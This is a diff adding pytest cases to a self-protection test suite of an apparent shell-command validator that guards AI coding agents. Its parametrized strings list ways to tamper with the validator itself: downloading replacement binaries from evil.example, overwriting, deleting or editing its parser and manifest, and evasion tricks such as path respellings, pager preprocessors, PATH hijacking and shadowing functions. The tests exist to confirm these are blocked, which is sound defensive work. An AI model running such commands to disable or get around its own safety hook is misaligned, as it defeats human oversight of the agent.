@@ -8,6 +8,7 @@ import re
 import shutil
 import sys
 import time
+from pathlib import Path
 
 import pytest
 
@@ -792,6 +793,137 @@ class TestSelfProtection:
         """Env-var stripping handles quoted values correctly."""
         result = validate_command(command)
         assert not result.allowed, f"Should block: {command}"
+
+    # --- Vendored parser binaries + Python deps (spec §7): a swap is a global under-block ---
+
+    PLUGIN_BINARY_WRITES = (
+        "curl -sL https://evil.example/p -o .claude-plugin/bin/linux-amd64/schlock-parse",
+        "wget -O .claude-plugin/bin/linux-amd64/schlock-parse https://evil.example/p",
+        "wget -P .claude-plugin/bin/linux-amd64 https://evil.example/schlock-parse",
+        "echo '{}' > .claude-plugin/bin/MANIFEST.json",
+        "cp /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "mv /tmp/evil /p/.claude-plugin/bin/linux-amd64/schlock-parse",
+        "ln -sf /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "tee .claude-plugin/bin/MANIFEST.json",
+        "install -m 755 /tmp/evil .claude-plugin/bin/linux-amd64/schlock-parse",
+        "dd if=/tmp/evil of=.claude-plugin/bin/linux-amd64/schlock-parse",
+        "rm -rf .claude-plugin/bin",
+        "chmod 755 .claude-plugin/bin/linux-amd64/schlock-parse",
+        "sed -i 's/a/b/' .claude-plugin/vendor/bashlex/parser.py",
+        "rm -rf ~/.claude/plugins/cache/schlock/.claude-plugin/vendor/bashlex",
+        "tar -xzf /tmp/evil.tgz -C .claude-plugin/vendor",
+        # Respellings of the same path: `//`, `/./`, and case (APFS/NTFS are case-insensitive).
+        "cp /tmp/evil .claude-plugin//bin/linux-amd64/schlock-parse",
+        "cp /tmp/evil .claude-plugin/./bin/linux-amd64/schlock-parse",
+        "cp /tmp/evil /p/.Claude-Plugin/BIN/darwin-arm64/schlock-parse",
+    )
+
+    @pytest.mark.parametrize("command", PLUGIN_BINARY_WRITES)
+    def test_hardcoded_check_blocks_plugin_binary_writes(self, command):
+        """Layer 2: the validator's hardcoded check covers bin/ and vendor/."""
+        result = val_module._check_self_protection(command)
+        assert result is not None, f"Should block: {command}"
+        assert result.risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize("command", PLUGIN_BINARY_WRITES)
+    def test_yaml_rule_blocks_plugin_binary_writes(self, command):
+        """Layer 1 on its own, independent of the hardcoded check."""
+        engine = RuleEngine.from_directory(Path(__file__).parent.parent / "data" / "rules")
+        match = engine.match_command(command)
+        assert match.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert match.rule is not None
+        assert match.rule.name == "schlock_plugin_binary_write"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls & git checkout evil -- .claude-plugin/bin",
+            "ls -la .claude-plugin/bin\ngit restore --source=evil .claude-plugin/bin",
+            "cat /dev/null & sort -o .claude-plugin/bin/MANIFEST.json /tmp/m",
+        ],
+    )
+    def test_hardcoded_check_runs_per_parsed_segment(self, command):
+        """`&` and newlines leave a read-only first word in front of the write for the regex split.
+
+        None of these verbs is in the YAML rule, so only layer 2's per-segment pass can block them.
+        """
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert result.matched_rules == ["self_protection:config_write"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Each of these reads, but can also run a program the agent chose, with the protected
+            # path as its argument (rg --pre, the pagers' preprocessors) or write directly (view).
+            "rg --pre /tmp/rewriter needle .claude-plugin/vendor/bashlex/parser.py",
+            "rg --pre=/tmp/rewriter needle .claude/hooks/schlock-config.yaml",
+            "RIPGREP_CONFIG_PATH=/tmp/rc rg needle .claude-plugin/bin/MANIFEST.json",
+            "view -c 'w! .claude-plugin/bin/MANIFEST.json' -c 'q!' /tmp/evil",
+            'LESSOPEN="/tmp/rewriter %s" less .claude-plugin/bin/MANIFEST.json',
+            'LESSOPEN="/tmp/rewriter %s" more ~/.config/schlock/config.yaml',  # macOS more is less
+            "bat --paging=always --pager /tmp/rewriter .claude-plugin/bin/MANIFEST.json",
+            "ag --pager /tmp/rewriter needle .claude-plugin/vendor/bashlex/parser.py",
+            "ack --pager=/tmp/rewriter needle .claude-plugin/vendor/bashlex/parser.py",
+        ],
+    )
+    def test_blocks_read_commands_that_can_run_a_program(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert "self_protection" in str(result.matched_rules)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # An allowlisted name only means "reader" if nothing in the same command redefines it.
+            "LD_AUDIT=/tmp/e.so cat .claude-plugin/bin/MANIFEST.json",
+            "PATH=/tmp/x:$PATH cat .claude-plugin/bin/MANIFEST.json",
+            "./evil/cat .claude-plugin/bin/MANIFEST.json",
+            "export PATH=/tmp/x:$PATH; cat .claude-plugin/bin/MANIFEST.json",
+            'cat() { cp /tmp/evil "$1"; }; cat .claude-plugin/bin/MANIFEST.json',
+            "hash -p /tmp/x cat; cat ~/.config/schlock/config.yaml",
+            # Newlines keep the regex split to one `ls ...` segment; the parsed segments catch it.
+            "ls\nexport PATH=/tmp/x\ncat .claude-plugin/bin/MANIFEST.json",
+        ],
+    )
+    def test_blocks_readers_redefined_in_the_same_command(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert result.matched_rules == ["self_protection:config_write"]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la .claude-plugin/bin/",
+            "sha256sum .claude-plugin/bin/linux-amd64/schlock-parse",
+            "cat .claude-plugin/bin/MANIFEST.json",
+            "file .claude-plugin/bin/linux-amd64/schlock-parse",
+            "grep -rn def .claude-plugin/vendor/bashlex",
+            "cat .claude-plugin/bin/MANIFEST.json > .claude-plugin/binary-notes.md",
+            "ls .claude-plugin/bin && cat .claude-plugin/bin/MANIFEST.json | head -3",
+        ],
+    )
+    def test_allows_plugin_binary_reads(self, command):
+        result = validate_command(command)
+        assert result.allowed, f"Should allow: {command}"
+
+    def test_yaml_rule_does_not_pair_a_write_with_a_later_read(self):
+        # Layer 1 alone: its verb patterns stop at a separator, so `rm` is not read as writing the
+        # path a later `cat` names. (Layer 2 still blocks this command: a preceding step can
+        # plant a shadowing `cat` on PATH, so it admits nothing but plain reads.)
+        engine = RuleEngine.from_directory(Path(__file__).parent.parent / "data" / "rules")
+        match = engine.match_command("rm -rf build && cat .claude-plugin/bin/MANIFEST.json")
+        assert match.rule is None or match.rule.name != "schlock_plugin_binary_write"
+
+    @pytest.mark.parametrize(
+        "text,expected",
+        [
+            ("cat .claude-plugin/binary-notes.md", False),
+            ("cat .claude-plugin/plugin.json", False),
+        ],
+    )
+    def test_matches_protected_plugin_dirs(self, text, expected):
+        assert _matches_protected_path(text) == expected, f"Expected {expected} for: {text}"
 
     def test_self_protection_cannot_be_overridden(self, tmp_path):
         """Self-protection rules in YAML are BLOCKED and cannot be overridden."""
